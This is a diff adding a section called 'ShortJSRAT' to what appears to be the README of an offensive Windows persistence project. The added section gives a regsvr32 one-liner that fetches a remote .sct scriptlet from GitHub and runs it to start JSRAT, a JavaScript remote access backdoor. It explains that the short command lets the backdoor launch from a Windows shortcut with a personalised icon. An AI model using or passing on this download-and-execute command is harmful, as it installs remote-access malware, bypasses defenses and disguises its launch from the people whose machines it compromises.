@@ -98,9 +98,26 @@ or (remote)
 
 2.run BackdoorTest.js to start JSRAT
 
- 
 
 
+---
+---
+
+##ShortJSRAT
+You can run the following code to start JSRAT:
+
+
+`regsvr32 /s /n /u /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/ShortJSRAT.sct scrobj.dll`
+
+###Why create this:
+
+Limit command length to 260 characters.
+
+
+When we create a Windows shortcut with personnalized icon to start JSRAT,the code of JSRAT is longer than 260charaters.
+
+
+But we can use regsvr32.exe to run .sct file with very few letters.
 
 
 
